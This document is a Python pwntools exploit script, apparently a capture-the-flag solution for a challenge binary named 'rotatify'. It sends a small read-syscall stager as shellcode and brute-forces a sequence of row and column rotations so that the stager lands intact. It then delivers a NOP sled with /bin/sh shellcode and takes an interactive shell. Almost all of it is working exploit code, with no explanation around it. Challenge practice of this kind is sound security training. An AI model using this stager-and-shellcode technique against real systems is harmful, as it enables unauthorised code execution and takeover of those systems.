from pwn import *
from itertools import product
from tqdm import tqdm
context.arch = 'amd64'
# context.log_level = 'debug'

io = process('./rotatify/target/release/rotatify')

stager = '''
push rax
pop rsi
push 0x58
pop rdx
push 0
pop rax
syscall
'''
shellcode = asm(stager)
shellcode = shellcode.ljust(16, b'\x00')

io.sendline(shellcode)

io.recvline()

origin = [list(shellcode[i:i+4]) for i in range(0,16,4)]
target_board = [list(map(int, io.recvline().split())) for _ in range(4)]

def rotate_row(board, row):
    row_copy = [0,0,0,0]
    for i in range(4):
        row_copy[(i+1)%4] = board[row][i]
    board[row] = row_copy

def rotate_col(board, col):
    col_copy = [0,0,0,0]
    for i in range(4):
        col_copy[(i+1)%4] = board[i][col]
    for i in range(4):
        board[i][col] = col_copy[i]
    

# print(list())
def solve():
    for steps in tqdm(product(range(8), repeat=8)):
        board = [row[:] for row in origin]
        for i in steps:
            if i < 4:
                rotate_col(board, i)
            else:
                rotate_row(board, i-4)
                # pass
        if board == target_board:
            return steps
    return []

steps = solve()
print(steps)

TABLE = [b'A', b'B', b'C', b'D', b'1', b'2', b'3', b'4']

for step in steps[::-1]:
    io.sendline(TABLE[step])
    io.sendline(TABLE[step])
    io.sendline(TABLE[step])

io.sendline(b'Q')

shellcode = asm(shellcraft.amd64.linux.sh())
io.sendline(b'\x90'*16+shellcode)
# print(origin)
io.interactive()